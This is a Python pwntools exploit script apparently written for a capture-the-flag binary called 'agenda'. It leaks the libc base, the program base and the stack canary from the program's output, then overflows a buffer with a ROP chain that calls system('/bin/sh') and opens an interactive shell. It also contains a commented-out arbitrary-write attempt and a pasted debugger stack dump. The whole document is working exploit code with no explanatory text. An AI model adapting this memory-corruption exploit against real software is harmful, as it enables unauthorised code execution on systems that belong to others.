from pwn import *
#08048C5B
env = {"LD_PRELOAD": "/home/giantbranch/Desktop/libc.so.6"}
sh = process("./agenda", env=env)
agenda = ELF("./agenda")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc = ELF("/home/giantbranch/Desktop/libc.so.6")
context.log_level = 'debug'
#gdb.attach(proc.pidof(sh)[0])
#b *0x0000555555554a6d

def read():
	sh.recvuntil("3. Quit\n")
	sh.sendline("2")
	content = sh.recvuntil("What")
	print(content)
	print("===")
	libc_addr = u64(content[-8-4:-4])
	base_addr = u64(content[-8-4-8:-8-4])
	canary_addr = u64(content[-8-4-8-8*5:-8-4-8-8*4])
	print(hex(agenda.symbols['__libc_csu_init']),hex(agenda.symbols['__libc_start_main']))
	base_addr = base_addr - agenda.symbols['__libc_csu_init']
	libc_addr = libc_addr - 240 - libc.symbols['__libc_start_main']
	print(hex(base_addr), hex(libc_addr),hex(canary_addr))
	return base_addr,libc_addr, canary_addr

def set(name, desc):
	sh.recvuntil("3. Quit\n")
	sh.sendline("1")
	sh.sendline(name)
	sh.sendline(desc)


	

def arbitity_write(address, payload):
	desc = "b" * 12 * 8 + p64(0x1) + p64(208) + p64(0x13) + p64(address) + p64(0x31)
	set("a",desc)
	set(p64(payload),"b")


name = "a" * (104-64) + p64(208)
print(name)
desc = "b"
set(name,desc)
base_addr,libc_addr, canary_addr = read()
system_addr = libc_addr + libc.symbols['system']
sh_addr = libc_addr + next(libc.search('/bin/sh'))
print(hex(system_addr), hex(sh_addr))
#name = "a"
#desc = "b" * 
##############################################################
# change the puts plt
"""
puts_plt_addr = base_addr + agenda.got['puts']
print('puts_plt_addr', hex(agenda.got['puts']))
desc = "b" * 15 * 8 + p64(0x7fffffffde20)
name = "a"
#name = "a" * (104-64) + p64(len(desc)) + p64(0x99) + p64(0xabcd)
set(name,desc)
set(p64(sh_addr),"2")
#read()
"""
#################################################################
#address_sh = 0x201f90 + base_addr
#address_system = 0x201f98 + base_addr
#print(hex(address_sh))
#arbitity_write(0x555555756000, sh_addr)
#arbitity_write(address_system, system_addr)

# ROP chain
#0x0000000000000b73 : pop rdi ; ret
pop_rdi_ret = base_addr + 0x0000000000000b73
print(hex(pop_rdi_ret))
rop_chain = p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)
payload = p64(canary_addr) * 25 + rop_chain
print(payload,len(payload))
name = "a" * (104-64) + p64(len(payload) + 16)
desc = payload
set(name,desc)
sh.interactive()

"""
0000| 0x7fffffffddd8 --> 0x555555554a8d (movzx  eax,BYTE PTR [rbp-0x2a])
0008| 0x7fffffffdde0 --> 0x3262 ('b2')
0016| 0x7fffffffdde8 --> 0x9900 
0024| 0x7fffffffddf0 --> 0xa00 ('')
0032| 0x7fffffffddf8 --> 0x0 
0040| 0x7fffffffde00 --> 0x0 
0048| 0x7fffffffde08 --> 0x0 
0056| 0x7fffffffde10 --> 0x0 
0064| 0x7fffffffde18 --> 0x0 
0072| 0x7fffffffde20 ("a\n", 'a' <repeats 13 times>...)
0080| 0x7fffffffde28 ('a' <repeats 15 times>...)
0088| 0x7fffffffde30 ('a' <repeats 15 times>...)
0096| 0x7fffffffde38 ('a' <repeats 15 times>...)
0104| 0x7fffffffde40 ("aaaaaaa", <incomplete sequence \320>)
0112| 0x7fffffffde48 --> 0xd0 
0120| 0x7fffffffde50 --> 0x620a ('\nb')
0128| 0x7fffffffde58 --> 0x7fffffffde20 ("a\n", 'a' <repeats 13 times>...)
0136| 0x7fffffffde60 --> 0x31 ('1')
0144| 0x7fffffffde68 --> 0x7fffffffdde0 --> 0x3262 ('b2')
0152| 0x7fffffffde70 --> 0xa317fffffffde9e 
0160| 0x7fffffffde78 --> 0xd7ccfd029d4ac800 
0168| 0x7fffffffde80 --> 0x555555554b10 (push   r15)

"""
